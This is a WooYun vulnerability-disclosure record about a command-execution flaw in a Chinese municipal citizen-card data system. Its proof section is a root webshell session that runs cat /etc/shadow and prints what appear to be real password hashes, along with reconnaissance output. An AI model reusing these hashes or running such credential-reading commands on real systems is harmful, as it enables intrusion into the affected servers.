{"id": 81776, "wybug_id": "wooyun-2015-0152874", "wybug_title": "某市数据数据采集系统命令执行漏洞getshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "朱元璋", "wybug_date": "2015-11-10 14:00", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： RT 详细说明：  \n\n张家港市民卡批量数据采集系统地址**.**.**.**:8080/dc-web-batch/login.action存在命令执行漏洞\n\n直接上传木马到服务器\n\n\n\n   漏洞证明：  \n[/root/zjgweb/apache-tomcat-6.0.26/webapps/dc-web-batch/dc-web-batch/]$ whoamiroot/bin/sh: line 0: cd: /root/zjgweb/apache-tomcat-6.0.26/webapps/dc-web-batch/dc-web-batch/: No such file or directory[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ chkconfig --listNetworkManager \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offacpid          \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offanacron        \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offapmd           \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offatd            \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offauditd         \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offautofs         \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offavahi-daemon   \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offavahi-dnsconfd \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offbluetooth      \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offcapi           \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offconman         \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offcpuspeed       \t0:off\t1:on\t2:on\t3:on\t4:on\t5:on\t6:offcrond          \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offcups           \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offdc_client      \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offdc_server      \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offdnsmasq        \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offdund           \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offfirstboot      \t0:off\t1:off\t2:off\t3:on\t4:off\t5:on\t6:offgpm            \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offhaldaemon      \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offhidd           \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offhplip          \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offhttpd          \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offip6tables      \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offipmi           \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offiptables       \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offirda           \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offirqbalance     \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offisdn           \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offkdump          \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offkudzu          \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offlm_sensors     \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offlvm2-monitor   \t0:off\t1:on\t2:on\t3:on\t4:on\t5:on\t6:offmcstrans       \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offmdmonitor      \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offmdmpd          \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offmessagebus     \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offmicrocode_ctl  \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offmultipathd     \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offmysql          \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offnetconsole     \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offnetfs          \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offnetplugd       \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offnetwork        \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offnfs            \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offnfslock        \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offnscd           \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offntpd           \t0:off\t1:off\t2:off\t3:on\t4:off\t5:on\t6:offpand           \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offpcscd          \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offportmap        \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offpsacct         \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offrawdevices     \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offrdisc          \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offreadahead_early\t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offreadahead_later\t0:off\t1:off\t2:off\t3:off\t4:off\t5:on\t6:offrestorecond    \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offrhnsd          \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offrpcgssd        \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offrpcidmapd      \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offrpcsvcgssd     \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offsaslauthd      \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offsendmail       \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offsetroubleshoot \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offsmartd         \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offsnmpd          \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offsnmptrapd      \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offsquid          \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offsshd           \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offsyslog         \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offsysstat        \t0:off\t1:off\t2:on\t3:on\t4:off\t5:on\t6:offtux            \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offvncserver      \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offvsftpd         \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offwdaemon        \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offwinbind        \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offwpa_supplicant \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offxfs            \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offxinetd         \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:offypbind         \t0:off\t1:off\t2:off\t3:off\t4:off\t5:off\t6:offyum-updatesd   \t0:off\t1:off\t2:on\t3:on\t4:on\t5:on\t6:offxinetd based services:\tchargen-dgram: \toff\tchargen-stream:\toff\tdaytime-dgram: \toff\tdaytime-stream:\toff\tdiscard-dgram: \toff\tdiscard-stream:\toff\techo-dgram:    \toff\techo-stream:   \toff\teklogin:       \toff\tekrb5-telnet:  \toff\tgssftp:        \toff\tklogin:        \toff\tkrb5-telnet:   \toff\tkshell:        \toff\trmcp:          \toff\trsync:         \toff\ttcpmux-server: \toff\ttftp:          \toff\ttime-dgram:    \toff\ttime-stream:   \toff[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ chkconfig --list atdatd            \t0:off\t1:off\t2:off\t3:on\t4:on\t5:on\t6:off[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ cat /etc/shadowroot:$1$PO9ir4ss$woXEIjJBQJKtZrKC8vgaf/:14729:0:99999:7:::bin:*:14728:0:99999:7:::daemon:*:14728:0:99999:7:::adm:*:14728:0:99999:7:::lp:*:14728:0:99999:7:::sync:*:14728:0:99999:7:::shutdown:*:14728:0:99999:7:::halt:*:14728:0:99999:7:::mail:*:14728:0:99999:7:::news:*:14728:0:99999:7:::uucp:*:14728:0:99999:7:::operator:*:14728:0:99999:7:::games:*:14728:0:99999:7:::gopher:*:14728:0:99999:7:::ftp:*:14728:0:99999:7:::nobody:*:14728:0:99999:7:::nscd:!!:14728:0:99999:7:::vcsa:!!:14728:0:99999:7:::rpc:!!:14728:0:99999:7:::mailnull:!!:14728:0:99999:7:::smmsp:!!:14728:0:99999:7:::pcap:!!:14728:0:99999:7:::ntp:!!:14728:0:99999:7:::dbus:!!:14728:0:99999:7:::avahi:!!:14728:0:99999:7:::sshd:!!:14728:0:99999:7:::rpcuser:!!:14728:0:99999:7:::nfsnobody:!!:14728:0:99999:7:::haldaemon:!!:14728:0:99999:7:::avahi-autoipd:!!:14728:0:99999:7:::distcache:!!:14728:0:99999:7:::apache:!!:14728:0:99999:7:::webalizer:!!:14728:0:99999:7:::squid:!!:14728:0:99999:7:::xfs:!!:14728:0:99999:7:::gdm:!!:14728:0:99999:7:::sabayon:!!:14728:0:99999:7:::user:$1$pdDkOI6I$JFJtnnlfxENd6gZQ191yu1:14728:0:99999:7:::mysql:$1$zUAcHuUD$7GeGTJKZyh7BMMiRzF3hI/:15000::::::java:$1$ehUj3BS0$PC32eB20nINWl3JRAZwK.0:14790:0:99999:7:::zjgsmk:$1$OmWE0ScG$Nmex0wNRsEAQ/Jk4y4Ull.:14790:0:99999:7:::oracle:$1$R/c.mkOe$KkwTbjvZ2akuatr7KuMef1:16528:0:99999:7:::digitalchina:$1$VhbxkMpi$kpKu0oLxU72wlSNeovgKu1:14865:0:99999:7:::[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ ifconfigeth0      Link encap:Ethernet  HWaddr E4:1F:13:61:9B:10            inet addr:**.**.**.**  Bcast:**.**.**.**  Mask:**.**.**.**          inet6 addr: fe80::e61f:13ff:fe61:9b10/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:48601149 errors:0 dropped:0 overruns:0 frame:0          TX packets:68442523 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:3043477558 (2.8 GiB)  TX bytes:2002988966 (1.8 GiB)          Interrupt:169 Memory:92000000-92012800 lo        Link encap:Local Loopback            inet addr:**.**.**.**  Mask:**.**.**.**          inet6 addr: ::1/128 Scope:Host          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:10353694 errors:0 dropped:0 overruns:0 frame:0          TX packets:10353694 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:1929325397 (1.7 GiB)  TX bytes:1929325397 (1.7 GiB)usb0      Link encap:Ethernet  HWaddr E6:1F:13:53:9B:13            inet6 addr: fe80::e41f:13ff:fe53:9b13/64 Scope:Link          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:5390460 errors:0 dropped:0 overruns:0 frame:0          TX packets:18 errors:9 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:350379900 (334.1 MiB)  TX bytes:4186 (4.0 KiB)[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ cat /etc/resolv.confsearch localdomainnameserver **.**.**.**[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ bash prompt:bash: prompt:: No such file or directory[/root/zjgweb/apache-tomcat-6.0.26/bin/]$ lsb_release -aLSB Version:\t:core-3.1-ia32:core-3.1-noarch:graphics-3.1-ia32:graphics-3.1-noarchDistributor ID:\tRedHatEnterpriseServerDescription:\tRed Hat Enterprise Linux Server release 5.4 (Tikanga)Release:\t5.4Codename:\tTikanga[/root/zjgweb/apache-tomcat-6.0.26/bin/]$\n   修复方案：  加强安全意识   版权声明：转载请注明来源 朱元璋@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-11-20 17:26 厂商回复： CNVD未直接复现所述情况，已经转由CNCERT下发给江苏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}